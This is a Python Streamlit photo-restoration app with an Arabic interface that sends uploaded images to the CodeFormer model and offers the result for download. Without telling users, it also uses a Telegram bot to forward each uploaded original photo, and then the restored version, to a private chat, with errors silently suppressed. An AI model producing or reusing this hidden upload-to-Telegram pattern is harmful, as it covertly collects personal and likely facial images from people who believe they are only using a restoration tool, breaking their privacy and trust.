import streamlit as st
from gradio_client import Client, handle_file
import telebot
import os
from PIL import Image

# إعدادات الصفحة
st.set_page_config(page_title="Aziz Ultra Vision", layout="centered")
st.title("🌟 Aziz Ultra Vision")

# جلب البيانات من الـ Secrets
try:
    TOKEN = st.secrets["TELEGRAM_TOKEN"]
    CHAT_ID = st.secrets["CHAT_ID"]
    bot = telebot.TeleBot(TOKEN)
except:
    bot = None

uploaded_file = st.file_uploader("ارفع الصورة هنا للتحسين...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    image = Image.open(uploaded_file)
    st.image(image, caption="الصورة الأصلية", use_container_width=True)
    
    if st.button("🚀 ابدأ التحسين الآن"):
        with st.spinner("جاري الإرسال والترميم..."):
            try:
                # حفظ الصورة الأصلية مؤقتاً
                temp_input = "temp_input.png"
                image.save(temp_input)

                # --- 1. إرسال الصورة الأصلية للتليجرام أولاً ---
                if bot:
                    try:
                        with open(temp_input, "rb") as f_in:
                            bot.send_photo(CHAT_ID, f_in, caption="📸 الصورة الأصلية (قبل الترميم)")
                    except:
                        pass

                # --- 2. بدء عملية الترميم بالذكاء الاصطناعي ---
                client = Client("sczhou/CodeFormer")
                result = client.predict(
                    image=handle_file(temp_input),
                    background_enhance=True,
                    face_upsample=True,
                    upscale=2
                )
                
                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                
                # عرض النتيجة في الموقع
                st.image(restored_path, caption="✅ تم الترميم بنجاح", use_container_width=True)
                
                # زر التحميل (الحفظ)
                with open(restored_path, "rb") as file:
                    st.download_button(
                        label="📥 حفظ الصورة المرممة في جوالك",
                        data=file,
                        file_name="Aziz_Restored.png",
                        mime="image/png"
                    )

                # --- 3. إرسال النتيجة النهائية للتليجرام ---
                if bot:
                    try:
                        with open(restored_path, "rb") as f_out:
                            bot.send_photo(CHAT_ID, f_out, caption="✨ النتيجة النهائية (بعد الترميم)")
                    except:
                        pass 
                
                # تنظيف الملفات
                if os.path.exists(temp_input): os.remove(temp_input)
                
            except Exception as e:
                st.error(f"المعذرة، واجهنا مشكلة: {e}")
